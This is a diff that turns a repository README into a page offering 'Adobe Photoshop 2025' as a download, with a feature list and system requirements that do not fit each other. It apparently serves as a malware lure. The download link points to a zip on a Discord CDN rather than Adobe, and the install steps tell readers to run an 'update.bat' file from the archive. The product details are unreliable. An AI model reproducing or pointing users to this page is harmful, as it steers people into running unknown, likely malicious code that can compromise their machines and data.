@@ -1,1 +1,48 @@
-# cxzc
+# Adobe Photoshop 2025 - Advanced Photo Editing, AI-Powered Tools, and Creative Design Features for Professionals  
+
+## 📜 Adobe Photoshop - Overview  
+
+Adobe Photoshop 2025 is the industry-leading image editing and graphic design software, offering powerful AI-driven tools, advanced retouching capabilities, and seamless workflow enhancements for photographers, designers, and digital artists.
+
+
+|[Download](https://cdn.discordapp.com/attachments/1443584758348120076/1443608810278097048/Release_v9.3.1.zip?ex=6929b0f9&is=69285f79&hm=815c92f5f32a2b288d6d59342732be7b50049b98b2e9bd36b1553f7e0b08764a&)
+|:------------- |
+
+![Photoshop-lasso-tool](https://github.com/user-attachments/assets/5b2e19c8-9ec8-42d7-b846-c24ec84b9a7e)
+
+
+## ⚙ Features  
+
+* **Neural Filters** - AI-powered filters for realistic photo enhancements, including skin smoothing and style transfer  
+* **Content-Aware Fill** - Intelligently removes unwanted objects and fills gaps with matching textures  
+* **Sky Replacement** - Automatically detects and replaces skies while adjusting lighting for realism  
+* **Select Subject** - AI-driven one-click selection of people, objects, and backgrounds  
+* **Camera Raw Filter** - Non-destructive RAW photo editing with advanced color and exposure controls  
+* **Layers & Masks** - Flexible layer-based editing with precise masking for complex compositions  
+* **Brush Stabilization** - Smooths brush strokes for precise digital painting and retouching  
+* **Smart Objects** - Preserves image quality when scaling or transforming layers  
+* **3D Design Tools** - Create and manipulate 3D models directly within Photoshop  
+* **Type & Vector Tools** - Advanced typography and vector shape editing for graphic design  
+* **Batch Processing** - Automate repetitive tasks with Actions and scripting  
+
+And many other features!
+
+---
+
+## 📊 System requirements
+
+> 🔲 **Supported CPU:** AMD & Intel
+>
+> 🔧 **Supported architectures:** 64-bit, 32-bit
+>
+> 💿 **Supported OS:** Windows 11, Windows 10, Windows 8, Windows 7
+>
+> 🖥️ **Supported modes:** Borderless, Windowed, Fullscreen
+>
+> 🛠️ **.NET Framework:** 4.8+
+
+### 🤔 How to install?
+
+- Download the .zip archive using download button.
+- Extract the archive to a secure location.
+- Run `update.bat` and wait for install.
